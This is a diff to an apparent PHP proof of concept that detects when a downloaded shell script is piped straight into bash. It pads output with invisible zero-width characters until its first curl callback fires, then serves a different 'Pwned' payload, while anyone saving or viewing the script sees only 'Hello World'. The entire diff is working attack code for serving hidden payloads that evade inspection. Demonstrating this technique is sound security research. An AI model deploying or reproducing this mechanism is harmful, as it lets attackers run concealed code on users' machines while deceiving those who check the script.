@@ -8,8 +8,16 @@ $id = uniqid();
 #!/bin/bash
 curl -L <?=$baseurl; ?>/download/<?=$id;?>.tar.gz -o download.tar.gz
 <?
-flush();
-sleep(1);
+flush(); 
+$startTime = time();
+// Fill buffer until time out or curl was executed
+while ((time() < $startTime +1) && !file_exists($id)) {
+    // Send Zero white space - unicode char
+    // Not visible in bash and most editors.
+    echo "\u{200B}"; 
+    flush();
+}
+// Check if $id was detected or we time out
 if (file_exists($id)) {
 ?>
 curl -s -G \
@@ -23,5 +31,6 @@ echo "!!! Pwned !!!"
 echo "Take a look at ~/pwned.txt in your home folder."
 
 <? } else { ?>
+
 echo "Hello World!"
 <?}
